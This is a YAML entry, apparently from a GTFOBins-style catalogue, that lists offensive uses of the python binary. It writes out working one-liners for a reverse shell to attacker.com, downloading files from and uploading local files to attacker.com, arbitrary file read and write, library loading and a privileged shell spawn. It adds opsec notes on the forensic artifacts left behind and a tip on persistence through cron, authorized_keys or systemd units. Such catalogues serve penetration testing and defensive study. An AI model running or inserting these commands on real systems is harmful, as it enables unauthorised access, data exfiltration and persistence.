---
name: python
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: The payloads are compatible with both Python version 2 and 3.
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    python -c 'import sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r
    else: import urllib as r
    r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: python -c 'print(open("/path/to/input-file").read())'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: python -c 'open("/path/to/output-file","w+").write("DATA")'
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    python -c 'import sys,socket,os,pty;s=socket.socket()
    s.connect(("attacker.com",12345))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    python -c 'import sys
    if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
    else: import urllib as u, urllib2 as r
    r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
- id: upload-2
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    python -c 'import sys
    if sys.version_info.major == 3: import http.server as s, socketserver as ss
    else: import SimpleHTTPServer as s, SocketServer as ss
    ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
references:
- https://gtfobins.github.io/gtfobins/python/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
